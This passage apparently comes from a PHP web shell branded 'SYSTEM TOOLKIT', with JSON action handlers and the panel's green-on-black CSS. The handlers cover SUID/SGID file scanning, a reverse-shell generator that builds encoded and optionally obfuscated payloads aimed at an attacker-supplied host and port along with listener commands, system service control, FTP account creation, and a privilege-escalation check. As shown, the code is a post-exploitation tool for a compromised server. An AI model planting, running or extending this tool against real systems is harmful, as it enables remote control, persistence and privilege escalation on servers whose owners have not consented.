                echo json_encode(['success' => true, 'sgid_files' => $results]);
                break;

            case 'suid_sgid_all':
                $suid = $scanner->findSuidFiles();
                $sgid = $scanner->findSgidFiles();
                echo json_encode([
                    'success' => true,
                    'suid_count' => count($suid),
                    'sgid_count' => count($sgid),
                    'suid_files' => $suid,
                    'sgid_files' => $sgid
                ]);
                break;

            default:
                safe_json_error('Unknown SUID action');
        }
    } catch (Exception $e) {
        safe_json_error('SUID scanner error: ' . $e->getMessage());
    }
    exit;
}

// ============================================================================
// SECTION K: FEATURE 10 - SESSION MANAGER ENDPOINTS
// ============================================================================

if (isset($_GET['action']) && strpos($_GET['action'], 'session_') === 0) {
    while (ob_get_level() > 0) { ob_end_clean(); }
    header('Content-Type: application/json; charset=utf-8');

    try {
        switch($_GET['action']) {
            case 'session_extend':
                if (!headers_sent()) {
                    @session_start();
                }
                $_SESSION['last_activity'] = time();
                echo json_encode([
                    'success' => true,
                    'message' => 'Session extended'
                ]);
                break;

            case 'session_info':
                if (!headers_sent()) {
                    @session_start();
                }
                echo json_encode(array(
                    'success' => true,
                    'session_id' => session_id(),
                    'session_timeout' => ini_get('session.gc_maxlifetime'),
                    'last_activity' => isset($_SESSION['last_activity']) ? $_SESSION['last_activity'] : 0
                ));
                break;

            default:
                safe_json_error('Unknown session action');
        }
    } catch (Exception $e) {
        safe_json_error('Session error: ' . $e->getMessage());
    }
    exit;
}

// ============================================================================
// REVERSE SHELL GENERATOR - Action Handlers
// ============================================================================

if (isset($_GET['action']) && strpos($_GET['action'], 'revshell_') === 0) {
    header('Content-Type: application/json');

    try {
        $action = $_GET['action'];

        switch ($action) {
            case 'revshell_generate':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }

                $lhost = isset($_POST['lhost']) ? $_POST['lhost'] : '';
                $lport = isset($_POST['lport']) ? $_POST['lport'] : '';
                $shell_type = isset($_POST['shell_type']) ? $_POST['shell_type'] : 'bash';
                $encoding = isset($_POST['encoding']) ? $_POST['encoding'] : 'none';
                $obfuscate = isset($_POST['obfuscate']) ? (bool)$_POST['obfuscate'] : false;

                // Validate inputs
                if (!ReverseShellGenerator::validate_ip($lhost)) {
                    throw new Exception('Invalid IP address');
                }

                if (!ReverseShellGenerator::validate_port($lport)) {
                    throw new Exception('Invalid port number (1-65535)');
                }

                $options = ['obfuscate' => $obfuscate];

                if ($shell_type === 'nc') {
                    $options['nc_type'] = isset($_POST['nc_type']) ? $_POST['nc_type'] : 'standard';
                }

                $result = ReverseShellGenerator::generate($shell_type, $lhost, $lport, $encoding, $options);
                echo json_encode($result);
                break;

            case 'revshell_listener':
                $listener_type = isset($_POST['listener_type']) ? $_POST['listener_type'] : (isset($_GET['listener_type']) ? $_GET['listener_type'] : 'nc');
                $listener_port = isset($_POST['listener_port']) ? $_POST['listener_port'] : (isset($_GET['listener_port']) ? $_GET['listener_port'] : 4444);

                $command = ReverseShellGenerator::generate_listener($listener_type, $listener_port);
                echo json_encode([
                    'success' => true,
                    'command' => $command,
                    'type' => $listener_type
                ]);
                break;

            case 'revshell_decode':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }

                $payload = isset($_POST['payload']) ? $_POST['payload'] : '';
                $encoding_type = isset($_POST['encoding_type']) ? $_POST['encoding_type'] : 'base64';

                if (empty($payload)) {
                    throw new Exception('Payload is required');
                }

                $decoded = '';
                switch ($encoding_type) {
                    case 'base64':
                        $decoded = base64_decode($payload, true);
                        break;
                    case 'urlencode':
                        $decoded = urldecode($payload);
                        break;
                    case 'hex':
                        $decoded = hex2bin($payload);
                        break;
                    default:
                        throw new Exception('Unknown encoding type');
                }

                if ($decoded === false) {
                    throw new Exception('Failed to decode payload');
                }

                echo json_encode([
                    'success' => true,
                    'decoded' => $decoded
                ]);
                break;

            case 'revshell_types':
            case 'revshell_shell_types':
                echo json_encode([
                    'success' => true,
                    'data' => ReverseShellGenerator::get_shell_types()
                ]);
                break;

            case 'revshell_encodings':
                echo json_encode([
                    'success' => true,
                    'data' => ReverseShellGenerator::get_encodings()
                ]);
                break;

            case 'revshell_listeners':
                echo json_encode([
                    'success' => true,
                    'data' => ReverseShellGenerator::get_listeners()
                ]);
                break;

            default:
                throw new Exception('Unknown reverse shell action');
        }

    } catch (Exception $e) {
        http_response_code(400);
        echo json_encode([
            'success' => false,
            'error' => $e->getMessage()
        ]);
    }
    exit;
}

// ============================================================================
// SERVICE MANAGER - Action Handlers
// ============================================================================

if (isset($_GET['action']) && strpos($_GET['action'], 'service_') === 0) {
    header('Content-Type: application/json');

    try {
        $manager = new ServiceManager();
        $action = $_GET['action'];

        switch ($action) {
            case 'service_list':
                $services = $manager->listServices();
                if (!is_array($services)) {
                    $services = [];
                }
                $json = json_encode([
                    'success' => true,
                    'data' => $services,
                    'count' => count($services)
                ]);
                if ($json === false) {
                    echo json_encode([
                        'success' => false,
                        'error' => 'JSON encoding failed: ' . json_last_error_msg(),
                        'data' => []
                    ]);
                } else {
                    echo $json;
                }
                break;

            case 'service_status':
                $serviceName = isset($_GET['service']) ? $_GET['service'] : (isset($_POST['service']) ? $_POST['service'] : '');
                if (empty($serviceName)) {
                    throw new Exception('Service name is required');
                }
                $status = $manager->getServiceStatus($serviceName);
                echo json_encode([
                    'success' => true,
                    'data' => $status
                ]);
                break;

            case 'service_start':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }
                $serviceName = isset($_POST['service']) ? $_POST['service'] : '';
                if (empty($serviceName)) {
                    throw new Exception('Service name is required');
                }
                $result = $manager->startService($serviceName);
                echo json_encode([
                    'success' => $result['success'],
                    'message' => $result['message'],
                    'data' => $result
                ]);
                break;

            case 'service_stop':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }
                $serviceName = isset($_POST['service']) ? $_POST['service'] : '';
                if (empty($serviceName)) {
                    throw new Exception('Service name is required');
                }
                $result = $manager->stopService($serviceName);
                echo json_encode([
                    'success' => $result['success'],
                    'message' => $result['message'],
                    'data' => $result
                ]);
                break;

            case 'service_restart':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }
                $serviceName = isset($_POST['service']) ? $_POST['service'] : '';
                if (empty($serviceName)) {
                    throw new Exception('Service name is required');
                }
                $result = $manager->restartService($serviceName);
                echo json_encode([
                    'success' => $result['success'],
                    'message' => $result['message'],
                    'data' => $result
                ]);
                break;

            case 'service_enable':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }
                $serviceName = isset($_POST['service']) ? $_POST['service'] : '';
                if (empty($serviceName)) {
                    throw new Exception('Service name is required');
                }
                $result = $manager->enableService($serviceName);
                echo json_encode([
                    'success' => $result['success'],
                    'message' => $result['message'],
                    'data' => $result
                ]);
                break;

            case 'service_disable':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }
                $serviceName = isset($_POST['service']) ? $_POST['service'] : '';
                if (empty($serviceName)) {
                    throw new Exception('Service name is required');
                }
                $result = $manager->disableService($serviceName);
                echo json_encode([
                    'success' => $result['success'],
                    'message' => $result['message'],
                    'data' => $result
                ]);
                break;

            case 'service_logs':
                $serviceName = isset($_GET['service']) ? $_GET['service'] : (isset($_POST['service']) ? $_POST['service'] : '');
                $lines = intval(isset($_GET['lines']) ? $_GET['lines'] : (isset($_POST['lines']) ? $_POST['lines'] : 50));
                if (empty($serviceName)) {
                    throw new Exception('Service name is required');
                }
                $logs = $manager->getServiceLogs($serviceName, $lines);
                echo json_encode([
                    'success' => true,
                    'data' => $logs
                ]);
                break;

            default:
                throw new Exception('Unknown service action');
        }

    } catch (Exception $e) {
        http_response_code(400);
        echo json_encode([
            'success' => false,
            'error' => $e->getMessage()
        ]);
    }
    exit;
}

// ============================================================================
// FTP MANAGER - Action Handlers
// ============================================================================

if (isset($_GET['action']) && strpos($_GET['action'], 'ftp_') === 0) {
    while (ob_get_level() > 0) { ob_end_clean(); }
    header('Content-Type: application/json');

    // Prevent "intl module already loaded" warning
    if (!extension_loaded('intl')) {
        // intl not loaded yet - safe to proceed
    }

    try {
        $manager = new FtpManager();
        $action = $_GET['action'];

        switch ($action) {
            case 'ftp_status':
                $status = $manager->checkServiceStatus();
                $sysInfo = $manager->getSystemInfo();
                $status = array_merge($status, $sysInfo);
                $shellCaps = getShellCapabilities();
                $status['shell_capabilities'] = $shellCaps;
                echo json_encode([
                    'success' => true,
                    'data' => $status
                ]);
                break;

            case 'ftp_enable':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }
                $result = $manager->enableService();
                echo json_encode([
                    'success' => $result['success'],
                    'message' => $result['message'],
                    'data' => $result
                ]);
                break;

            case 'ftp_disable':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }
                $result = $manager->disableService();
                echo json_encode([
                    'success' => $result['success'],
                    'message' => $result['message'],
                    'data' => $result
                ]);
                break;

            case 'ftp_restart':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }
                $result = $manager->restartService();
                echo json_encode([
                    'success' => $result['success'],
                    'message' => $result['message'],
                    'data' => $result
                ]);
                break;

            case 'ftp_config':
                $config = $manager->getConfig();
                echo json_encode([
                    'success' => true,
                    'data' => $config
                ]);
                break;

            case 'ftp_user_create':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }
                $username = isset($_POST['username']) ? $_POST['username'] : '';
                $password = isset($_POST['password']) ? $_POST['password'] : '';
                $homeDir = isset($_POST['homeDir']) ? $_POST['homeDir'] : '';
                $result = $manager->createUser($username, $password, $homeDir);
                echo json_encode([
                    'success' => $result['success'],
                    'message' => $result['message'],
                    'data' => $result
                ]);
                break;

            case 'ftp_user_list':
                $users = $manager->listUsers();
                echo json_encode([
                    'success' => true,
                    'data' => $users
                ]);
                break;

            case 'ftp_privilege_check':
                $privesc = $manager->checkPrivilegeEscalationOptions();
                echo json_encode([
                    'success' => true,
                    'data' => $privesc
                ]);
                break;

            case 'ftp_connections':
                $conns = $manager->getActiveConnections();
                echo json_encode([
                    'success' => true,
                    'data' => $conns
                ]);
                break;

            case 'ftp_logs':
                $search = !empty($_GET['search']) ? $_GET['search'] : (!empty($_POST['search']) ? $_POST['search'] : '');
                $lines = intval(!empty($_GET['lines']) ? $_GET['lines'] : (!empty($_POST['lines']) ? $_POST['lines'] : 50));
                $logs = $manager->getLogs($lines, $search);
                echo json_encode([
                    'success' => true,
                    'data' => $logs
                ]);
                break;

            case 'ftp_backup_config':
                $backup = $manager->backupConfig();
                echo json_encode([
                    'success' => $backup['success'],
                    'data' => $backup
                ]);
                break;

            case 'ftp_user_directory':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }
                $username = isset($_POST['username']) ? $_POST['username'] : '';
                $directory = isset($_POST['directory']) ? $_POST['directory'] : '';
                $result = $manager->setUserDirectory($username, $directory);
                echo json_encode([
                    'success' => $result['success'],
                    'data' => $result
                ]);
                break;

            case 'ftp_ssl_status':
                $ssl = $manager->getSSLStatus();
                echo json_encode([
                    'success' => true,
                    'data' => $ssl
                ]);
                break;

            case 'ftp_user_delete':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }
                $username = isset($_POST['username']) ? $_POST['username'] : '';
                $result = $manager->deleteUser($username);
                echo json_encode([
                    'success' => $result['success'],
                    'message' => $result['message'],
                    'data' => $result
                ]);
                break;

            case 'ftp_user_password':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }
                $username = isset($_POST['username']) ? $_POST['username'] : '';
                $newPassword = isset($_POST['newPassword']) ? $_POST['newPassword'] : '';
                $result = $manager->changePassword($username, $newPassword);
                echo json_encode([
                    'success' => $result['success'],
                    'message' => $result['message'],
                    'data' => $result
                ]);
                break;

            case 'ftp_user_enable':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }
                $username = isset($_POST['username']) ? $_POST['username'] : '';
                $result = $manager->enableUser($username);
                echo json_encode([
                    'success' => $result['success'],
                    'message' => $result['message'],
                    'data' => $result
                ]);
                break;

            case 'ftp_user_disable':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }
                $username = isset($_POST['username']) ? $_POST['username'] : '';
                $result = $manager->disableUser($username);
                echo json_encode([
                    'success' => $result['success'],
                    'message' => $result['message'],
                    'data' => $result
                ]);
                break;

            case 'ftp_security':
                $settings = $manager->getSecuritySettings();
                echo json_encode([
                    'success' => true,
                    'data' => $settings
                ]);
                break;

            case 'ftp_backup':
                if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                    throw new Exception('POST request required');
                }
                $result = $manager->backupConfiguration();
                echo json_encode([
                    'success' => $result['success'],
                    'message' => $result['message'],
                    'data' => $result
                ]);
                break;

            default:
                throw new Exception('Unknown FTP action');
        }

    } catch (Exception $e) {
        http_response_code(400);
        echo json_encode([
            'success' => false,
            'error' => $e->getMessage()
        ]);
    }
    exit;
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<meta name="theme-color" content="#0f0f0f">
<title>:: SYSTEM TOOLKIT ::</title>
<style>
/* ========== SYSTEM TOOLKIT v2 — Design Tokens ========== */
:root{
  --primary:#00ff40;
  --primary-dim:#00cc33;
  --primary-glow:rgba(0,255,64,.35);
  --bg:#0f0f0f;
  --bg-panel:#141414;
  --bg-panel-alt:#191919;
  --bg-input:#0a0a0a;
  --border:rgba(0,255,64,.22);
  --border-strong:rgba(0,255,64,.55);
  --text:#c9ffd6;
  --text-dim:#6b8f75;
  --text-faint:#3f5a48;
  --danger:#ff4d4d;
  --danger-dim:rgba(255,77,77,.15);
  --warn:#ffc400;
  --warn-dim:rgba(255,196,0,.15);
  --ok-dim:rgba(0,255,64,.13);
  --font:'Courier New', Courier, monospace;
  --radius:8px;
  --cyan:#6cf;
  --cyan-dim:rgba(102,204,255,.15);
  --magenta:#f0f;
}
*{box-sizing:border-box;margin:0;padding:0;}
html,body{height:100%;}
body{
  background:var(--bg);
  color:var(--text);
  font-family:var(--font);
  font-size:15px;
  overflow-x:hidden;
  min-height:100vh;
}
body::before{
  content:"";position:fixed;inset:0;
  background-image:linear-gradient(rgba(0,255,64,.035) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,64,.035) 1px,transparent 1px);
  background-size:34px 34px;pointer-events:none;z-index:0;
}
body::after{
  content:"";position:fixed;inset:0;
  background:radial-gradient(circle at 12% 8%,rgba(0,255,64,.10),transparent 40%),radial-gradient(circle at 88% 92%,rgba(0,255,64,.08),transparent 45%);
  pointer-events:none;z-index:0;
}
::-webkit-scrollbar{width:10px;height:10px;}
::-webkit-scrollbar-track{background:var(--bg-panel);}
::-webkit-scrollbar-thumb{background:var(--primary-dim);border-radius:6px;}
::-webkit-scrollbar-thumb:hover{background:var(--primary);}
a{color:inherit;text-decoration:none;}
button{font-family:var(--font);cursor:pointer;}
input,select,textarea{font-family:var(--font);}
pre{font-family:var(--font);margin:0;}

/* ========== Layout ========== */
.app{position:relative;z-index:1;display:flex;min-height:100vh;}
.sidebar{
  width:220px;flex-shrink:0;
  background:linear-gradient(180deg,var(--bg-panel),var(--bg));
  border-right:1px solid var(--border);
  display:flex;flex-direction:column;
  position:sticky;top:0;height:100vh;
}
.brand{padding:22px 18px 16px;border-bottom:1px solid var(--border);}
.brand-logo{font-weight:bold;font-size:16.5px;letter-spacing:1px;color:var(--primary);text-shadow:0 0 8px var(--primary-glow);display:flex;align-items:center;gap:8px;}
.brand-logo .cursor{display:inline-block;width:8px;height:14px;background:var(--primary);animation:blink 1.1s steps(1) infinite;}
@keyframes blink{50%{opacity:0;}}
.brand-sub{margin-top:4px;font-size:10.5px;color:var(--text-dim);letter-spacing:2px;}
.nav{flex:1;padding:14px 10px;display:flex;flex-direction:column;gap:4px;overflow-y:auto;}
.nav-item{
  display:flex;align-items:center;gap:10px;
  padding:10px 12px;border-radius:6px;
  color:var(--text-dim);border:1px solid transparent;
  font-size:13px;letter-spacing:.5px;transition:.15s;
  background:transparent;width:100%;text-align:left;
}
.nav-item svg{width:16px;height:16px;flex-shrink:0;}
.nav-item:hover{color:var(--text);background:var(--bg-panel-alt);}
.nav-item.active{color:var(--primary);background:var(--ok-dim);border-color:var(--border-strong);box-shadow:0 0 12px -4px var(--primary-glow) inset;}
.nav-tag{margin-left:auto;font-size:11.5px;padding:2px 6px;border-radius:20px;border:1px solid var(--border);color:var(--text-faint);}
.sidebar-foot{padding:14px 16px 18px;border-top:1px solid var(--border);font-size:10.5px;color:var(--text-faint);line-height:1.6;}
.sidebar-foot b{color:var(--text-dim);}
.main{flex:1;min-width:0;display:flex;flex-direction:column;}
.topbar{
  height:56px;border-bottom:1px solid var(--border);
  display:flex;align-items:center;padding:0 22px;gap:14px;
  background:rgba(20,20,20,.5);backdrop-filter:blur(2px);
  position:sticky;top:0;z-index:5;
}
.topbar-title{font-size:15px;color:var(--text);letter-spacing:.5px;}
.topbar-title .dim{color:var(--text-dim);}
.topbar-right{margin-left:auto;display:flex;align-items:center;gap:16px;font-size:11.5px;color:var(--text-dim);}
.dot{width:6px;height:6px;border-radius:50%;background:var(--primary);box-shadow:0 0 6px var(--primary);display:inline-block;margin-right:6px;}
.content{padding:24px;flex:1;}
.view{display:none;animation:fadein .25s ease;}
.view.active{display:block;}
@keyframes fadein{from{opacity:0;transform:translateY(4px);}to{opacity:1;transform:none;}}
.section-title{font-size:12px;color:var(--primary);letter-spacing:2px;margin-bottom:14px;display:flex;align-items:center;gap:8px;}
.section-title::before{content:"//";color:var(--text-faint);}

/* ========== Panels & Cards ========== */
.panel{background:var(--bg-panel);border:1px solid var(--border);border-radius:var(--radius);}
.panel-head{padding:8px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:6px;font-size:11.5px;color:var(--text-dim);letter-spacing:.5px;}
.panel-body{padding:10px;}
.stat-row{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:16px;}
.stat-card{background:var(--bg-panel);border:1px solid var(--border);border-radius:var(--radius);padding:10px 12px;}
.stat-card .label{font-size:11.5px;color:var(--text-dim);letter-spacing:1px;}
.stat-card .value{font-size:19px;color:var(--primary);margin-top:4px;text-shadow:0 0 10px var(--primary-glow);}
.tool-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;}
.tool-card{
  background:var(--bg-panel);border:1px solid var(--border);border-radius:var(--radius);
  padding:12px;cursor:pointer;transition:.18s;position:relative;overflow:hidden;
}
.tool-card:hover{border-color:var(--border-strong);transform:translateY(-2px);box-shadow:0 8px 20px -10px rgba(0,255,64,.3);}
.tool-card .icon{width:30px;height:30px;border-radius:6px;background:var(--ok-dim);border:1px solid var(--border-strong);display:flex;align-items:center;justify-content:center;color:var(--primary);margin-bottom:8px;}
.tool-card .icon svg{width:16px;height:16px;}
.tool-card h3{font-size:12px;color:var(--text);letter-spacing:.3px;margin-bottom:3px;}
.tool-card p{font-size:10.5px;color:var(--text-dim);line-height:1.4;margin-bottom:6px;}
.tool-card .tags{display:flex;flex-wrap:wrap;gap:4px;margin-bottom:8px;}
.tag{font-size:10.5px;color:var(--text-dim);border:1px solid var(--border);padding:1px 6px;border-radius:20px;}
.tool-card .launch{font-size:10.5px;color:var(--primary);letter-spacing:.8px;display:flex;align-items:center;gap:4px;}
.tool-card .launch svg{width:10px;height:10px;transition:.15s;}
.tool-card:hover .launch svg{transform:translateX(3px);}

/* ========== Buttons ========== */
.btn{
  font-size:11.5px;letter-spacing:.5px;padding:8px 14px;border-radius:6px;
  border:1px solid var(--border-strong);background:var(--ok-dim);color:var(--primary);
  display:inline-flex;align-items:center;gap:6px;transition:.15s;
}
.btn:hover{background:var(--primary);color:#04150a;box-shadow:0 0 14px -2px var(--primary-glow);}
.btn.ghost{background:transparent;color:var(--text-dim);border-color:var(--border);}
.btn.ghost:hover{color:var(--text);background:var(--bg-panel-alt);}
.btn.danger{color:var(--danger);border-color:rgba(255,77,77,.4);background:var(--danger-dim);}
.btn.danger:hover{background:var(--danger);color:#1a0000;}
.btn.small{padding:5px 9px;font-size:10.5px;}
.persist-badge{font-size:10px;padding:2px 8px;border-radius:3px;background:var(--bg-panel-alt);color:var(--text-dim);font-weight:500;}
.btn svg{width:13px;height:13px;}
.icon-btn{
  width:26px;height:26px;border-radius:5px;border:1px solid var(--border);
  display:flex;align-items:center;justify-content:center;color:var(--text-dim);background:transparent;
}
.icon-btn:hover{color:var(--primary);border-color:var(--border-strong);background:var(--ok-dim);}
.icon-btn svg{width:13px;height:13px;}

/* ========== Tables ========== */
.table-wrap{overflow-x:auto;padding-bottom:60px;}
table{width:100%;border-collapse:collapse;font-size:12px;}
th{text-align:left;color:var(--text-dim);font-weight:normal;padding:6px 8px;border-bottom:1px solid var(--border);font-size:10.5px;letter-spacing:1px;text-transform:uppercase;}
td{padding:6px 8px;border-bottom:1px solid rgba(0,255,64,.08);color:var(--text);vertical-align:middle;}
tr:hover td{background:rgba(0,255,64,.035);}
.row-icon{display:flex;align-items:center;gap:6px;}
.row-icon svg{width:14px;height:14px;color:var(--primary);flex-shrink:0;}
.actions-cell{display:flex;gap:4px;}

/* ========== Badges ========== */
.badge{font-size:11.5px;padding:3px 9px;border-radius:20px;letter-spacing:.5px;border:1px solid transparent;display:inline-flex;align-items:center;gap:5px;}
.badge.on{color:var(--primary);background:var(--ok-dim);border-color:var(--border-strong);}
.badge.off{color:var(--danger);background:var(--danger-dim);border-color:rgba(255,77,77,.4);}
.badge.warn{color:var(--warn);background:var(--warn-dim);border-color:rgba(255,196,0,.4);}
.badge i{width:6px;height:6px;border-radius:50%;background:currentColor;}

/* ========== Forms ========== */
.field label{font-size:10.5px;color:var(--text-dim);letter-spacing:.5px;display:block;margin-bottom:5px;}
.field input[type=text],.field input[type=number],.field input[type=password],.field textarea,.field select{
  width:100%;background:var(--bg-input);border:1px solid var(--border);border-radius:5px;
  color:var(--text);padding:8px 10px;font-size:12px;outline:none;resize:vertical;
}
.field input:focus,.field textarea:focus,.field select:focus{border-color:var(--border-strong);box-shadow:0 0 0 2px rgba(0,255,64,.08);}
.field textarea{min-height:66px;}
.row-inline{display:flex;gap:8px;}
.row-inline .field{flex:1;}
.chk-row{display:flex;flex-wrap:wrap;gap:10px;font-size:11.5px;color:var(--text-dim);}
.chk-row label{display:flex;align-items:center;gap:5px;cursor:pointer;}
.mini-tool{background:var(--bg-panel);border:1px solid var(--border);border-radius:var(--radius);padding:10px;display:flex;flex-direction:column;gap:6px;}
.mini-tool h4{font-size:12px;color:var(--primary);letter-spacing:.5px;display:flex;align-items:center;gap:7px;}
.mini-tool h4 svg{width:14px;height:14px;}
.mini-tool .out{background:var(--bg-input);border:1px dashed var(--border);border-radius:5px;padding:8px 10px;font-size:12px;color:var(--primary);min-height:38px;word-break:break-all;white-space:pre-wrap;max-height:130px;overflow-y:auto;}
.mini-tool .actions{display:flex;gap:8px;flex-wrap:wrap;}

/* ========== Terminal ========== */
.term{
  background:#000;border:1px solid var(--border-strong);border-radius:6px;
  padding:12px 14px;font-size:12px;color:var(--primary);
  height:180px;overflow-y:auto;line-height:1.8;white-space:pre-wrap;word-break:break-all;
}
.term .ln{opacity:.9;}
.term .ln .t{color:var(--text-faint);margin-right:8px;}
.term .caret{display:inline-block;width:7px;height:12px;background:var(--primary);vertical-align:middle;animation:blink 1s steps(1) infinite;}

/* ========== Breadcrumbs ========== */
.crumbs{display:flex;align-items:center;gap:6px;font-size:12px;flex-wrap:wrap;}
.crumbs button,.crumbs a{background:transparent;border:none;color:var(--text-dim);padding:4px 6px;border-radius:4px;cursor:pointer;}
.crumbs button:hover,.crumbs a:hover{color:var(--primary);background:var(--ok-dim);}
.crumbs button.current,.crumbs a.current{color:var(--primary);}
.crumbs .sep{color:var(--text-faint);}

/* ========== Toolbar & Search ========== */
.toolbar{display:flex;align-items:center;gap:10px;flex-wrap:wrap;padding:12px 16px;border-bottom:1px solid var(--border);}
.search-box{margin-left:auto;display:flex;align-items:center;gap:8px;background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:6px 10px;min-width:200px;}
.search-box svg{width:14px;height:14px;color:var(--text-dim);}
.search-box input{background:transparent;border:none;outline:none;color:var(--text);font-size:12px;width:100%;}
.search-box input::placeholder{color:var(--text-faint);}

/* ========== Grid helpers ========== */
.grid-2{display:grid;grid-template-columns:2fr 1fr;gap:16px;}
.grid-3{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;}
.stack{display:flex;flex-direction:column;gap:16px;}
.meters{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:16px;}
.meter{background:var(--bg-panel-alt);border:1px solid var(--border);border-radius:6px;padding:12px 14px;}
.meter .top{display:flex;justify-content:space-between;font-size:11.5px;color:var(--text-dim);margin-bottom:8px;}
.meter .top b{color:var(--text);}
.meter .bar{height:6px;border-radius:4px;background:#000;overflow:hidden;border:1px solid var(--border);}
.meter .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--primary-dim),var(--primary));}

/* ========== Toast ========== */
#toast{position:fixed;bottom:20px;right:20px;z-index:999;display:flex;flex-direction:column;gap:8px;}
.toast-item{
  background:var(--bg-panel);border:1px solid var(--border-strong);border-left:3px solid var(--primary);
  color:var(--text);padding:10px 14px;border-radius:6px;font-size:12px;
  box-shadow:0 8px 20px -6px rgba(0,0,0,.6);
  animation:toastin .18s ease,toastout .25s ease 2.6s forwards;min-width:220px;
}
@keyframes toastin{from{opacity:0;transform:translateX(14px);}to{opacity:1;transform:none;}}
@keyframes toastout{to{opacity:0;transform:translateX(14px);}}

/* ========== Modals ========== */
.modal-overlay{
  display:none;position:fixed;inset:0;z-index:200;
  background:rgba(0,0,0,.65);backdrop-filter:blur(3px);
  align-items:center;justify-content:center;padding:20px;
}
.modal-overlay.open{display:flex;}
.modal{
  background:var(--bg-panel);border:1px solid var(--border-strong);border-radius:var(--radius);
  width:100%;max-height:90vh;display:flex;flex-direction:column;
  box-shadow:0 24px 60px -20px rgba(0,0,0,.75),0 0 0 1px rgba(0,255,64,.05);
  animation:modalIn .18s ease;
}
@keyframes modalIn{from{opacity:0;transform:translateY(10px) scale(.98);}to{opacity:1;transform:none;}}
.modal--sm{max-width:380px;}
.modal--md{max-width:600px;}
.modal--lg{max-width:900px;}
.modal--full{max-width:1100px;width:calc(100% - 24px);height:calc(100% - 24px);max-height:none;}
.modal-head{
  padding:14px 18px;border-bottom:1px solid var(--border);
  display:flex;align-items:center;justify-content:space-between;gap:12px;flex-shrink:0;
}
.modal-head h3{font-size:13.5px;color:var(--primary);letter-spacing:.5px;margin:0;}
.modal-close{
  width:28px;height:28px;flex-shrink:0;border-radius:6px;border:1px solid var(--border);
  background:transparent;color:var(--text-dim);display:flex;align-items:center;justify-content:center;font-size:15px;
}
.modal-close:hover{color:var(--primary);border-color:var(--border-strong);background:var(--ok-dim);}
.modal-body{padding:18px;overflow-y:auto;flex:1;font-size:13px;color:var(--text-dim);line-height:1.7;}
.modal-body .term{height:100%;max-height:none;}
.modal-foot{padding:12px 18px;border-top:1px solid var(--border);display:flex;justify-content:flex-end;gap:10px;flex-shrink:0;}
.modal-header{padding:14px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;gap:12px;flex-shrink:0;}
.modal-header h3{font-size:13.5px;color:var(--primary);letter-spacing:.5px;margin:0;}
.modal-footer{padding:12px 18px;border-top:1px solid var(--border);display:flex;justify-content:flex-end;gap:10px;flex-shrink:0;}

/* ========== Bottom Nav (mobile) ========== */
.bottom-nav{
  display:none;position:fixed;left:0;right:0;bottom:0;z-index:50;
  background:rgba(15,15,15,.92);backdrop-filter:blur(8px);
  border-top:1px solid var(--border-strong);
  padding:6px 4px calc(6px + env(safe-area-inset-bottom,0px));
  box-shadow:0 -8px 24px -10px rgba(0,0,0,.6);
}
.bottom-nav-inner{display:flex;align-items:stretch;}
.bn-item{
  flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;
  background:transparent;border:none;color:var(--text-dim);
  padding:8px 2px;min-height:52px;border-radius:10px;position:relative;
}
.bn-item svg{width:20px;height:20px;}
.bn-item span{font-size:11.5px;letter-spacing:.3px;}
.bn-item.active{color:var(--primary);}
.bn-item.active::before{
  content:"";position:absolute;top:2px;left:50%;transform:translateX(-50%);
  width:18px;height:2px;border-radius:2px;background:var(--primary);box-shadow:0 0 8px var(--primary-glow);
}
.swipe-dots{display:none;justify-content:center;gap:6px;padding:2px 0 14px;}
.swipe-dots i{width:5px;height:5px;border-radius:50%;background:var(--border-strong);}
.swipe-dots i.on{background:var(--primary);box-shadow:0 0 6px var(--primary-glow);}

/* ========== Drop Zone ========== */
.drop-zone{
  border:1px dashed var(--border);border-radius:var(--radius);padding:10px;text-align:center;
  background:var(--bg-panel-alt);transition:.2s;min-height:48px;cursor:pointer;
  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;
}
.drop-zone:hover{border-color:var(--primary);background:var(--ok-dim);}
.drop-zone.hover,.drop-zone.drag-over{border-color:var(--primary);background:var(--ok-dim);}
.drop-label{font-size:11.5px;color:var(--text-dim);pointer-events:none;}
.drop-file-list{margin-top:6px;font-size:10.5px;color:var(--text-dim);text-align:left;width:100%;}

/* File Manager bottom panels compact grid */
